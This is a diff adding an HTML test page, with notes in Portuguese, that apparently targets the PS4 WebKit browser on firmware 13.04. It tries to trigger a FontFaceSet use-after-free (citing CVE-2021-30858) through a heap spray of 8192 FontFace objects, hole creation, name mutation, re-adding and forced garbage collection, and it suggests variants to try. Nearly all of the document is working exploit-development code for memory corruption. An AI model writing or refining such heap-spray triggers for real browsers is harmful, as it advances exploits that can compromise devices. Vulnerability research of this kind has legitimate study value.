@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>TEST 03 - FontFaceSet UAF Pattern</title>
+</head>
+<body>
+
+<h2>TEST 03 - FontFaceSet Heap Manipulation</h2>
+<p>Alvo: use-after-free / heap corruption via FontFaceSet</p>
+<p>API: FontFaceSet, FontFace, Array spray</p>
+<p>Base: classe de vulnerabilidade confirmada no PS4 (CVE-2021-30858 related, FontFaceSet presente no PS4 WebKit)</p>
+<p>Nota: FW 13.04 pode ter patches - mas variantes do padrão ainda relevantes</p>
+
+<pre id="log">Aguardando inicio...</pre>
+<button onclick="checkSupport()">CHECAR SUPORTE</button>
+<button onclick="startTest()">INICIAR TESTE</button>
+
+<script>
+var log = document.getElementById('log');
+
+function append(msg) {
+  log.textContent += '\n' + msg;
+}
+
+function checkSupport() {
+  append('[03] Checando APIs...');
+  append('[03] FontFace: ' + (typeof FontFace !== 'undefined' ? 'PRESENTE' : 'AUSENTE'));
+  append('[03] FontFaceSet: ' + (typeof FontFaceSet !== 'undefined' ? 'PRESENTE' : 'AUSENTE'));
+  append('[03] document.fonts: ' + (typeof document.fonts !== 'undefined' ? 'PRESENTE' : 'AUSENTE'));
+}
+
+function startTest() {
+  if (typeof FontFace === 'undefined') {
+    append('[03] FontFace nao disponivel neste browser. Pulando...');
+    return;
+  }
+
+  append('[03] Iniciando spray de FontFace objects...');
+
+  var SPRAY_COUNT = 0x2000; // 8192 fonts
+  var bad_fonts = [];
+  var step = 0;
+
+  // Step 1: Spray heap with FontFace objects in known size class
+  try {
+    for (var i = 0; i < SPRAY_COUNT; i++) {
+      // Each FontFace with unique family name to force individual heap alloc
+      var ff = new FontFace("testfont_" + i, "url(data:text/html,)", {
+        weight: "normal",
+        style: "normal"
+      });
+      bad_fonts.push(ff);
+    }
+    append('[03] Step 1: ' + SPRAY_COUNT + ' FontFace objects criados no heap');
+  } catch(e) {
+    append('[03] Step 1 excecao: ' + e.message);
+    return;
+  }
+
+  // Step 2: Create a FontFaceSet with many fonts - then mutate family names
+  try {
+    var subset = bad_fonts.slice(0, 200);
+    var ffs = new FontFaceSet(subset);
+    append('[03] Step 2: FontFaceSet criado com 200 fonts | size=' + ffs.size);
+
+    // Step 3: Mass delete from middle to create holes
+    for (var j = 50; j < 150; j++) {
+      ffs.delete(bad_fonts[j]);
+    }
+    append('[03] Step 3: 100 fonts deletados do FontFaceSet (criando holes no heap)');
+
+    // Step 4: Mutate family names of remaining fonts while set still holds refs
+    // This can trigger reallocation of internal string storage
+    for (var k = 0; k < SPRAY_COUNT; k++) {
+      bad_fonts[k].family = "mutated_" + k + "_" + Math.random().toString(36);
+    }
+    append('[03] Step 4: Todos os family names mutados');
+
+    // Step 5: Re-add deleted fonts (now with new family names) to trigger re-hash
+    for (var m = 50; m < 150; m++) {
+      ffs.add(bad_fonts[m]);
+    }
+    append('[03] Step 5: Fonts re-adicionados ao FontFaceSet');
+    append('[03] FontFaceSet.size final: ' + ffs.size);
+
+  } catch(e) {
+    append('[03] Steps 2-5 excecao: ' + e.message);
+  }
+
+  // Step 6: Force GC while FontFaceSet holds references
+  append('[03] Step 6: Forcando pressao de memoria...');
+  var pressure = [];
+  try {
+    for (var p = 0; p < 50000; p++) {
+      pressure.push(new Array(100).fill(p));
+    }
+  } catch(e) {
+    append('[03] Pressao de memoria excecao: ' + e.message);
+  }
+
+  // Step 7: Nullify all references and let GC decide fate
+  bad_fonts = null;
+  pressure = null;
+  append('[03] Step 7: Referencias nulificadas. Aguardando GC...');
+
+  setTimeout(function() {
+    append('[03] Se chegou aqui sem crash: browser resistiu a este padrao neste FW');
+    append('[03] Tente variantes: FontFaceSet com set vazio, FontFace com URL invalida longa');
+  }, 3000);
+}
+</script>
+
+</body>
+</html>
